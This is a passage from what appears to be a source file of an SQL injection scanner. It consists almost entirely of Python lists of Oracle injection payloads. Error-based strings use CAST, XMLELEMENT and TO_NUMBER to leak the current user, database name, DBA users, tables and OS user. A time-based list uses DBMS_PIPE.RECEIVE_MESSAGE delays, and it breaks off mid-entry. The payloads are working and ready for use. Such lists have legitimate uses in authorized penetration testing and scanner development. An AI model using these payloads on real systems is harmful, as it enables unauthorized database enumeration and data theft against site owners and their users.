CAST(USERENV(chr(99)) AS NUMBER(10,2)) FROM DUAL)-- -', "' AND 1=(SELECT CAST(USERENV(chr(99)) AS NUMBER(10,2)) FROM DUAL)-- -", ' OR 1=(SELECT CAST(USERENV(chr(99)) AS NUMBER(10,2)) FROM DUAL)-- -', ' ,(SELECT CAST(USERENV(chr(99)) AS NUMBER(10,2)) FROM DUAL)-- -', ' AND 1=(SELECT CAST(SYS_CONTEXT(chr(117),chr(99)) AS NUMBER(10,2)) FROM DUAL)-- -', "' AND 1=(SELECT CAST(SYS_CONTEXT(chr(117),chr(99)) AS NUMBER(10,2)) FROM DUAL)-- -", ' OR 1=(SELECT CAST(SYS_CONTEXT(chr(117),chr(99)) AS NUMBER(10,2)) FROM DUAL)-- -', ' ,(SELECT CAST(SYS_CONTEXT(chr(117),chr(99)) AS NUMBER(10,2)) FROM DUAL)-- -', ' AND 1=(SELECT CAST(DBMS_SESSION.UNIQUE_SESSION_ID AS NUMBER(10,2)) FROM DUAL)-- -', "' AND 1=(SELECT CAST(DBMS_SESSION.UNIQUE_SESSION_ID AS NUMBER(10,2)) FROM DUAL)-- -", ' OR 1=(SELECT CAST(DBMS_SESSION.UNIQUE_SESSION_ID AS NUMBER(10,2)) FROM DUAL)-- -', ' ,(SELECT CAST(DBMS_SESSION.UNIQUE_SESSION_ID AS NUMBER(10,2)) FROM DUAL)-- -', ' AND 1=(SELECT CAST(USER AS DATE) FROM DUAL)-- -', "' AND 1=(SELECT CAST(USER AS DATE) FROM DUAL)-- -", ' OR 1=(SELECT CAST(USER AS DATE) FROM DUAL)-- -', ' ,(SELECT CAST(USER AS DATE) FROM DUAL)-- -', ' AND 1=(SELECT CAST(CURRENT_USER AS DATE) FROM DUAL)-- -', "' AND 1=(SELECT CAST(CURRENT_USER AS DATE) FROM DUAL)-- -", ' OR 1=(SELECT CAST(CURRENT_USER AS DATE) FROM DUAL)-- -', ' ,(SELECT CAST(CURRENT_USER AS DATE) FROM DUAL)-- -', ' AND 1=(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS DATE) FROM DUAL)-- -', "' AND 1=(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS DATE) FROM DUAL)-- -", ' OR 1=(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS DATE) FROM DUAL)-- -', ' ,(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS DATE) FROM DUAL)-- -', ' AND 1=(SELECT CAST((SELECT username FROM dba_users WHERE rownum=1) AS DATE) FROM DUAL)-- -', "' AND 1=(SELECT CAST((SELECT username FROM dba_users WHERE rownum=1) AS DATE) FROM DUAL)-- -", ' OR 1=(SELECT CAST((SELECT username FROM dba_users WHERE rownum=1) AS DATE) FROM DUAL)-- -', ' ,(SELECT CAST((SELECT username FROM dba_users WHERE rownum=1) AS DATE) FROM DUAL)-- -', ' AND 1=(SELECT CAST((SELECT table_name FROM dba_tables WHERE rownum=1) AS DATE) FROM DUAL)-- -', "' AND 1=(SELECT CAST((SELECT table_name FROM dba_tables WHERE rownum=1) AS DATE) FROM DUAL)-- -", ' OR 1=(SELECT CAST((SELECT table_name FROM dba_tables WHERE rownum=1) AS DATE) FROM DUAL)-- -', ' ,(SELECT CAST((SELECT table_name FROM dba_tables WHERE rownum=1) AS DATE) FROM DUAL)-- -', ' AND 1=(SELECT CAST(SYS_CONTEXT(chr(117),chr(99)) AS DATE) FROM DUAL)-- -', "' AND 1=(SELECT CAST(SYS_CONTEXT(chr(117),chr(99)) AS DATE) FROM DUAL)-- -", ' OR 1=(SELECT CAST(SYS_CONTEXT(chr(117),chr(99)) AS DATE) FROM DUAL)-- -', ' ,(SELECT CAST(SYS_CONTEXT(chr(117),chr(99)) AS DATE) FROM DUAL)-- -', ' AND 1=(SELECT CAST(USER AS TIMESTAMP) FROM DUAL)-- -', "' AND 1=(SELECT CAST(USER AS TIMESTAMP) FROM DUAL)-- -", ' OR 1=(SELECT CAST(USER AS TIMESTAMP) FROM DUAL)-- -', ' ,(SELECT CAST(USER AS TIMESTAMP) FROM DUAL)-- -', ' AND 1=(SELECT CAST(CURRENT_USER AS TIMESTAMP) FROM DUAL)-- -', "' AND 1=(SELECT CAST(CURRENT_USER AS TIMESTAMP) FROM DUAL)-- -", ' OR 1=(SELECT CAST(CURRENT_USER AS TIMESTAMP) FROM DUAL)-- -', ' ,(SELECT CAST(CURRENT_USER AS TIMESTAMP) FROM DUAL)-- -', ' AND 1=(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS TIMESTAMP) FROM DUAL)-- -', "' AND 1=(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS TIMESTAMP) FROM DUAL)-- -", ' OR 1=(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS TIMESTAMP) FROM DUAL)-- -', ' ,(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS TIMESTAMP) FROM DUAL)-- -', ' AND 1=(SELECT CAST((SELECT username FROM dba_users WHERE rownum=1) AS TIMESTAMP) FROM DUAL)-- -', "' AND 1=(SELECT CAST((SELECT username FROM dba_users WHERE rownum=1) AS TIMESTAMP) FROM DUAL)-- -", ' OR 1=(SELECT CAST((SELECT username FROM dba_users WHERE rownum=1) AS TIMESTAMP) FROM DUAL)-- -', ' ,(SELECT CAST((SELECT username FROM dba_users WHERE rownum=1) AS TIMESTAMP) FROM DUAL)-- -', ' AND 1=(SELECT CAST(USER AS INTERVAL DAY TO SECOND) FROM DUAL)-- -', "' AND 1=(SELECT CAST(USER AS INTERVAL DAY TO SECOND) FROM DUAL)-- -", ' OR 1=(SELECT CAST(USER AS INTERVAL DAY TO SECOND) FROM DUAL)-- -', ' ,(SELECT CAST(USER AS INTERVAL DAY TO SECOND) FROM DUAL)-- -', ' AND 1=(SELECT CAST(CURRENT_USER AS INTERVAL DAY TO SECOND) FROM DUAL)-- -', "' AND 1=(SELECT CAST(CURRENT_USER AS INTERVAL DAY TO SECOND) FROM DUAL)-- -", ' OR 1=(SELECT CAST(CURRENT_USER AS INTERVAL DAY TO SECOND) FROM DUAL)-- -', ' ,(SELECT CAST(CURRENT_USER AS INTERVAL DAY TO SECOND) FROM DUAL)-- -', ' AND 1=(SELECT CAST(SYSDATE AS INTERVAL DAY TO SECOND) FROM DUAL)-- -', "' AND 1=(SELECT CAST(SYSDATE AS INTERVAL DAY TO SECOND) FROM DUAL)-- -", ' OR 1=(SELECT CAST(SYSDATE AS INTERVAL DAY TO SECOND) FROM DUAL)-- -', ' ,(SELECT CAST(SYSDATE AS INTERVAL DAY TO SECOND) FROM DUAL)-- -', ' AND 1=(SELECT CAST(USER AS BLOB) FROM DUAL)-- -', "' AND 1=(SELECT CAST(USER AS BLOB) FROM DUAL)-- -", ' OR 1=(SELECT CAST(USER AS BLOB) FROM DUAL)-- -', ' ,(SELECT CAST(USER AS BLOB) FROM DUAL)-- -', ' AND 1=(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS BLOB) FROM DUAL)-- -', "' AND 1=(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS BLOB) FROM DUAL)-- -", ' OR 1=(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS BLOB) FROM DUAL)-- -', ' ,(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS BLOB) FROM DUAL)-- -', ' AND 1=(SELECT CAST(USER AS RAW(2000)) FROM DUAL)-- -', "' AND 1=(SELECT CAST(USER AS RAW(2000)) FROM DUAL)-- -", ' OR 1=(SELECT CAST(USER AS RAW(2000)) FROM DUAL)-- -', ' ,(SELECT CAST(USER AS RAW(2000)) FROM DUAL)-- -', ' AND 1=(SELECT CAST((SELECT username FROM dba_users WHERE rownum=1) AS RAW(2000)) FROM DUAL)-- -', "' AND 1=(SELECT CAST((SELECT username FROM dba_users WHERE rownum=1) AS RAW(2000)) FROM DUAL)-- -", ' OR 1=(SELECT CAST((SELECT username FROM dba_users WHERE rownum=1) AS RAW(2000)) FROM DUAL)-- -', ' ,(SELECT CAST((SELECT username FROM dba_users WHERE rownum=1) AS RAW(2000)) FROM DUAL)-- -', ' AND 1=(SELECT XMLELEMENT(name tag,USER) FROM DUAL)-- -', "' AND 1=(SELECT XMLELEMENT(name tag,USER) FROM DUAL)-- -", ' OR 1=(SELECT XMLELEMENT(name tag,USER) FROM DUAL)-- -', ' ,(SELECT XMLELEMENT(name tag,USER) FROM DUAL)-- -', ' AND 1=(SELECT XMLELEMENT(name tag,CURRENT_USER) FROM DUAL)-- -', "' AND 1=(SELECT XMLELEMENT(name tag,CURRENT_USER) FROM DUAL)-- -", ' OR 1=(SELECT XMLELEMENT(name tag,CURRENT_USER) FROM DUAL)-- -', ' ,(SELECT XMLELEMENT(name tag,CURRENT_USER) FROM DUAL)-- -', ' AND 1=(SELECT XMLELEMENT(name tag,SESSION_USER) FROM DUAL)-- -', "' AND 1=(SELECT XMLELEMENT(name tag,SESSION_USER) FROM DUAL)-- -", ' OR 1=(SELECT XMLELEMENT(name tag,SESSION_USER) FROM DUAL)-- -', ' ,(SELECT XMLELEMENT(name tag,SESSION_USER) FROM DUAL)-- -', ' AND 1=(SELECT XMLELEMENT(name tag,SYSDATE) FROM DUAL)-- -', "' AND 1=(SELECT XMLELEMENT(name tag,SYSDATE) FROM DUAL)-- -", ' OR 1=(SELECT XMLELEMENT(name tag,SYSDATE) FROM DUAL)-- -', ' ,(SELECT XMLELEMENT(name tag,SYSDATE) FROM DUAL)-- -', ' AND 1=(SELECT XMLELEMENT(name tag,(SELECT name FROM v$database WHERE rownum=1)) FROM DUAL)-- -', "' AND 1=(SELECT XMLELEMENT(name tag,(SELECT name FROM v$database WHERE rownum=1)) FROM DUAL)-- -", ' OR 1=(SELECT XMLELEMENT(name tag,(SELECT name FROM v$database WHERE rownum=1)) FROM DUAL)-- -', ' ,(SELECT XMLELEMENT(name tag,(SELECT name FROM v$database WHERE rownum=1)) FROM DUAL)-- -', ' AND 1=(SELECT XMLELEMENT(name tag,(SELECT username FROM dba_users WHERE rownum=1)) FROM DUAL)-- -', "' AND 1=(SELECT XMLELEMENT(name tag,(SELECT username FROM dba_users WHERE rownum=1)) FROM DUAL)-- -", ' OR 1=(SELECT XMLELEMENT(name tag,(SELECT username FROM dba_users WHERE rownum=1)) FROM DUAL)-- -', ' ,(SELECT XMLELEMENT(name tag,(SELECT username FROM dba_users WHERE rownum=1)) FROM DUAL)-- -', ' AND 1=(SELECT XMLELEMENT(name tag,(SELECT table_name FROM dba_tables WHERE rownum=1)) FROM DUAL)-- -', "' AND 1=(SELECT XMLELEMENT(name tag,(SELECT table_name FROM dba_tables WHERE rownum=1)) FROM DUAL)-- -", ' OR 1=(SELECT XMLELEMENT(name tag,(SELECT table_name FROM dba_tables WHERE rownum=1)) FROM DUAL)-- -', ' ,(SELECT XMLELEMENT(name tag,(SELECT table_name FROM dba_tables WHERE rownum=1)) FROM DUAL)-- -', ' AND 1=(SELECT XMLELEMENT(name tag,UID) FROM DUAL)-- -', "' AND 1=(SELECT XMLELEMENT(name tag,UID) FROM DUAL)-- -", ' OR 1=(SELECT XMLELEMENT(name tag,UID) FROM DUAL)-- -', ' ,(SELECT XMLELEMENT(name tag,UID) FROM DUAL)-- -', ' AND 1=(SELECT XMLELEMENT(name tag,SYS_CONTEXT(chr(117),chr(99))) FROM DUAL)-- -', "' AND 1=(SELECT XMLELEMENT(name tag,SYS_CONTEXT(chr(117),chr(99))) FROM DUAL)-- -", ' OR 1=(SELECT XMLELEMENT(name tag,SYS_CONTEXT(chr(117),chr(99))) FROM DUAL)-- -', ' ,(SELECT XMLELEMENT(name tag,SYS_CONTEXT(chr(117),chr(99))) FROM DUAL)-- -', ' AND 1=(SELECT XMLELEMENT(NAME e, XMLATTRIBUTES(USER AS v)) FROM DUAL)-- -', "' AND 1=(SELECT XMLELEMENT(NAME e, XMLATTRIBUTES(USER AS v)) FROM DUAL)-- -", ' OR 1=(SELECT XMLELEMENT(NAME e, XMLATTRIBUTES(USER AS v)) FROM DUAL)-- -', ' ,(SELECT XMLELEMENT(NAME e, XMLATTRIBUTES(USER AS v)) FROM DUAL)-- -', ' AND 1=(SELECT XMLELEMENT(NAME e, XMLATTRIBUTES(CURRENT_USER AS v)) FROM DUAL)-- -', "' AND 1=(SELECT XMLELEMENT(NAME e, XMLATTRIBUTES(CURRENT_USER AS v)) FROM DUAL)-- -", ' OR 1=(SELECT XMLELEMENT(NAME e, XMLATTRIBUTES(CURRENT_USER AS v)) FROM DUAL)-- -', ' ,(SELECT XMLELEMENT(NAME e, XMLATTRIBUTES(CURRENT_USER AS v)) FROM DUAL)-- -', ' AND 1=(SELECT XMLELEMENT(NAME e, XMLATTRIBUTES(SYSDATE AS v)) FROM DUAL)-- -', "' AND 1=(SELECT XMLELEMENT(NAME e, XMLATTRIBUTES(SYSDATE AS v)) FROM DUAL)-- -", ' OR 1=(SELECT XMLELEMENT(NAME e, XMLATTRIBUTES(SYSDATE AS v)) FROM DUAL)-- -', ' ,(SELECT XMLELEMENT(NAME e, XMLATTRIBUTES(SYSDATE AS v)) FROM DUAL)-- -', ' AND 1=(SELECT XMLELEMENT(NAME e, XMLATTRIBUTES((SELECT name FROM v$database WHERE rownum=1) AS v)) FROM DUAL)-- -', "' AND 1=(SELECT XMLELEMENT(NAME e, XMLATTRIBUTES((SELECT name FROM v$database WHERE rownum=1) AS v)) FROM DUAL)-- -", ' OR 1=(SELECT XMLELEMENT(NAME e, XMLATTRIBUTES((SELECT name FROM v$database WHERE rownum=1) AS v)) FROM DUAL)-- -', ' ,(SELECT XMLELEMENT(NAME e, XMLATTRIBUTES((SELECT name FROM v$database WHERE rownum=1) AS v)) FROM DUAL)-- -', ' AND 1=(SELECT XMLELEMENT(NAME e, XMLATTRIBUTES((SELECT username FROM dba_users WHERE rownum=1) AS v)) FROM DUAL)-- -', "' AND 1=(SELECT XMLELEMENT(NAME e, XMLATTRIBUTES((SELECT username FROM dba_users WHERE rownum=1) AS v)) FROM DUAL)-- -", ' OR 1=(SELECT XMLELEMENT(NAME e, XMLATTRIBUTES((SELECT username FROM dba_users WHERE rownum=1) AS v)) FROM DUAL)-- -', ' ,(SELECT XMLELEMENT(NAME e, XMLATTRIBUTES((SELECT username FROM dba_users WHERE rownum=1) AS v)) FROM DUAL)-- -', ' AND 1=TO_NUMBER(USER)-- -', "' AND 1=TO_NUMBER(USER)-- -", ' OR 1=TO_NUMBER(USER)-- -', ' AND 1=TO_NUMBER(CURRENT_USER)-- -', "' AND 1=TO_NUMBER(CURRENT_USER)-- -", ' OR 1=TO_NUMBER(CURRENT_USER)-- -', ' AND 1=TO_NUMBER(SESSION_USER)-- -', "' AND 1=TO_NUMBER(SESSION_USER)-- -", ' OR 1=TO_NUMBER(SESSION_USER)-- -', ' AND 1=TO_NUMBER((SELECT name FROM v$database WHERE rownum=1))-- -', "' AND 1=TO_NUMBER((SELECT name FROM v$database WHERE rownum=1))-- -", ' OR 1=TO_NUMBER((SELECT name FROM v$database WHERE rownum=1))-- -', ' AND 1=TO_NUMBER((SELECT username FROM dba_users WHERE rownum=1))-- -', "' AND 1=TO_NUMBER((SELECT username FROM dba_users WHERE rownum=1))-- -", ' OR 1=TO_NUMBER((SELECT username FROM dba_users WHERE rownum=1))-- -', ' AND 1=TO_NUMBER((SELECT table_name FROM dba_tables WHERE rownum=1))-- -', "' AND 1=TO_NUMBER((SELECT table_name FROM dba_tables WHERE rownum=1))-- -", ' OR 1=TO_NUMBER((SELECT table_name FROM dba_tables WHERE rownum=1))-- -', ' AND 1=TO_NUMBER((SELECT osuser FROM v$session WHERE rownum=1))-- -', "' AND 1=TO_NUMBER((SELECT osuser FROM v$session WHERE rownum=1))-- -", ' OR 1=TO_NUMBER((SELECT osuser FROM v$session WHERE rownum=1))-- -', ' AND 1=TO_NUMBER(SYS_CONTEXT(chr(117),chr(99)))-- -', "' AND 1=TO_NUMBER(SYS_CONTEXT(chr(117),chr(99)))-- -", ' OR 1=TO_NUMBER(SYS_CONTEXT(chr(117),chr(99)))-- -', ' AND 1=TO_NUMBER(USERENV(chr(99)))-- -', "' AND 1=TO_NUMBER(USERENV(chr(99)))-- -", ' OR 1=TO_NUMBER(USERENV(chr(99)))-- -', ' AND 1=TO_NUMBER(USERENV(chr(100)))-- -', "' AND 1=TO_NUMBER(USERENV(chr(100)))-- -", ' OR 1=TO_NUMBER(USERENV(chr(100)))-- -', ' AND 1=(SELECT CAST(USER AS NUMBER(10,2)) FROM DUAL)/**/-- -', "' AND 1=(SELECT CAST(USER AS NUMBER(10,2)) FROM DUAL)/**/-- -", ' OR 1=(SELECT CAST(USER AS NUMBER(10,2)) FROM DUAL)/**/-- -', ' ,(SELECT CAST(USER AS NUMBER(10,2)) FROM DUAL)/**/-- -', ' AND 1=(SELECT CAST(CURRENT_USER AS NUMBER(10,2)) FROM DUAL)/**/-- -', "' AND 1=(SELECT CAST(CURRENT_USER AS NUMBER(10,2)) FROM DUAL)/**/-- -", ' OR 1=(SELECT CAST(CURRENT_USER AS NUMBER(10,2)) FROM DUAL)/**/-- -', ' ,(SELECT CAST(CURRENT_USER AS NUMBER(10,2)) FROM DUAL)/**/-- -', ' AND 1=(SELECT CAST(SESSION_USER AS NUMBER(10,2)) FROM DUAL)/**/-- -', "' AND 1=(SELECT CAST(SESSION_USER AS NUMBER(10,2)) FROM DUAL)/**/-- -", ' OR 1=(SELECT CAST(SESSION_USER AS NUMBER(10,2)) FROM DUAL)/**/-- -', ' ,(SELECT CAST(SESSION_USER AS NUMBER(10,2)) FROM DUAL)/**/-- -', ' AND 1=(SELECT CAST(SYSDATE AS NUMBER(10,2)) FROM DUAL)/**/-- -', "' AND 1=(SELECT CAST(SYSDATE AS NUMBER(10,2)) FROM DUAL)/**/-- -", ' OR 1=(SELECT CAST(SYSDATE AS NUMBER(10,2)) FROM DUAL)/**/-- -', ' ,(SELECT CAST(SYSDATE AS NUMBER(10,2)) FROM DUAL)/**/-- -', ' AND 1=(SELECT CAST(SYSTIMESTAMP AS NUMBER(10,2)) FROM DUAL)/**/-- -', "' AND 1=(SELECT CAST(SYSTIMESTAMP AS NUMBER(10,2)) FROM DUAL)/**/-- -", ' OR 1=(SELECT CAST(SYSTIMESTAMP AS NUMBER(10,2)) FROM DUAL)/**/-- -', ' ,(SELECT CAST(SYSTIMESTAMP AS NUMBER(10,2)) FROM DUAL)/**/-- -', ' AND 1=(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)/**/-- -', "' AND 1=(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)/**/-- -", ' OR 1=(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)/**/-- -', ' ,(SELECT CAST((SELECT name FROM v$database WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)/**/-- -', ' AND 1=(SELECT CAST((SELECT value FROM v$parameter WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)/**/-- -', "' AND 1=(SELECT CAST((SELECT value FROM v$parameter WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)/**/-- -", ' OR 1=(SELECT CAST((SELECT value FROM v$parameter WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)/**/-- -', ' ,(SELECT CAST((SELECT value FROM v$parameter WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)/**/-- -', ' AND 1=(SELECT CAST((SELECT osuser FROM v$session WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)/**/-- -', "' AND 1=(SELECT CAST((SELECT osuser FROM v$session WHERE rownum=1) AS NUMBER(10,2)) FROM DUAL)/**/-- -"]
 
 ORACLE_TIMEBASED_PAYLOADS = ["' AND (SELECT CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr000',1) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN 1=2 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr000',1) ELSE 0 END FROM DUAL)>=0-- -", "' OR (SELECT CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr000',1) ELSE 0 END FROM DUAL)>=0-- -", " AND (SELECT CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr000',1) ELSE 0 END FROM DUAL)>=0-- -", " OR (SELECT CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr000',1) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN 1<>2 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr001',1) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN 1=1 AND 1=2 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr001',1) ELSE 0 END FROM DUAL)>=0-- -", "' OR (SELECT CASE WHEN 1<>2 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr001',1) ELSE 0 END FROM DUAL)>=0-- -", " AND (SELECT CASE WHEN 1<>2 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr001',1) ELSE 0 END FROM DUAL)>=0-- -", " OR (SELECT CASE WHEN 1<>2 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr001',1) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN 2>1 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr002',1) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN 2<1 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr002',1) ELSE 0 END FROM DUAL)>=0-- -", "' OR (SELECT CASE WHEN 2>1 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr002',1) ELSE 0 END FROM DUAL)>=0-- -", " AND (SELECT CASE WHEN 2>1 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr002',1) ELSE 0 END FROM DUAL)>=0-- -", " OR (SELECT CASE WHEN 2>1 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr002',1) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN USER IS NOT NULL THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr003',1) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN USER IS NULL THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr003',1) ELSE 0 END FROM DUAL)>=0-- -", "' OR (SELECT CASE WHEN USER IS NOT NULL THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr003',1) ELSE 0 END FROM DUAL)>=0-- -", " AND (SELECT CASE WHEN USER IS NOT NULL THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr003',1) ELSE 0 END FROM DUAL)>=0-- -", " OR (SELECT CASE WHEN USER IS NOT NULL THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr003',1) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN LENGTH(USER)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr004',1) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN LENGTH(USER)<0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr004',1) ELSE 0 END FROM DUAL)>=0-- -", "' OR (SELECT CASE WHEN LENGTH(USER)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr004',1) ELSE 0 END FROM DUAL)>=0-- -", " AND (SELECT CASE WHEN LENGTH(USER)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr004',1) ELSE 0 END FROM DUAL)>=0-- -", " OR (SELECT CASE WHEN LENGTH(USER)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr004',1) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM all_tables)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr005',1) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM all_tables)<0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr005',1) ELSE 0 END FROM DUAL)>=0-- -", "' OR (SELECT CASE WHEN (SELECT COUNT(*) FROM all_tables)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr005',1) ELSE 0 END FROM DUAL)>=0-- -", " AND (SELECT CASE WHEN (SELECT COUNT(*) FROM all_tables)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr005',1) ELSE 0 END FROM DUAL)>=0-- -", " OR (SELECT CASE WHEN (SELECT COUNT(*) FROM all_tables)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr005',1) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN ROWNUM>=0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr006',1) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN ROWNUM<-1 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr006',1) ELSE 0 END FROM DUAL)>=0-- -", "' OR (SELECT CASE WHEN ROWNUM>=0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr006',1) ELSE 0 END FROM DUAL)>=0-- -", " AND (SELECT CASE WHEN ROWNUM>=0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr006',1) ELSE 0 END FROM DUAL)>=0-- -", " OR (SELECT CASE WHEN ROWNUM>=0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr006',1) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN EXISTS(SELECT 1 FROM DUAL) THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr007',1) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN NOT EXISTS(SELECT 1 FROM DUAL) THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr007',1) ELSE 0 END FROM DUAL)>=0-- -", "' OR (SELECT CASE WHEN EXISTS(SELECT 1 FROM DUAL) THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr007',1) ELSE 0 END FROM DUAL)>=0-- -", " AND (SELECT CASE WHEN EXISTS(SELECT 1 FROM DUAL) THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr007',1) ELSE 0 END FROM DUAL)>=0-- -", " OR (SELECT CASE WHEN EXISTS(SELECT 1 FROM DUAL) THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr007',1) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN (SELECT SUM(1) FROM all_users)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr008',1) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN (SELECT SUM(1) FROM all_users)<0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr008',1) ELSE 0 END FROM DUAL)>=0-- -", "' OR (SELECT CASE WHEN (SELECT SUM(1) FROM all_users)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr008',1) ELSE 0 END FROM DUAL)>=0-- -", " AND (SELECT CASE WHEN (SELECT SUM(1) FROM all_users)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr008',1) ELSE 0 END FROM DUAL)>=0-- -", " OR (SELECT CASE WHEN (SELECT SUM(1) FROM all_users)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr008',1) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN MOD(5,2)=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr009',1) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN MOD(5,2)=0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr009',1) ELSE 0 END FROM DUAL)>=0-- -", "' OR (SELECT CASE WHEN MOD(5,2)=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr009',1) ELSE 0 END FROM DUAL)>=0-- -", " AND (SELECT CASE WHEN MOD(5,2)=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr009',1) ELSE 0 END FROM DUAL)>=0-- -", " OR (SELECT CASE WHEN MOD(5,2)=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr009',1) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN POWER(2,2)=4 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr010',1) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN POWER(2,2)=5 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr010',1) ELSE 0 END FROM DUAL)>=0-- -", "' OR (SELECT CASE WHEN POWER(2,2)=4 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr010',1) ELSE 0 END FROM DUAL)>=0-- -", " AND (SELECT CASE WHEN POWER(2,2)=4 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr010',1) ELSE 0 END FROM DUAL)>=0-- -", " OR (SELECT CASE WHEN POWER(2,2)=4 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr010',1) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN ROUND(3.14159,2)>3 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr011',1) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN ROUND(3.14159,2)<3 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr011',1) ELSE 0 END FROM DUAL)>=0-- -", "' OR (SELECT CASE WHEN ROUND(3.14159,2)>3 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr011',1) ELSE 0 END FROM DUAL)>=0-- -", " AND (SELECT CASE WHEN ROUND(3.14159,2)>3 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr011',1) ELSE 0 END FROM DUAL)>=0-- -", " OR 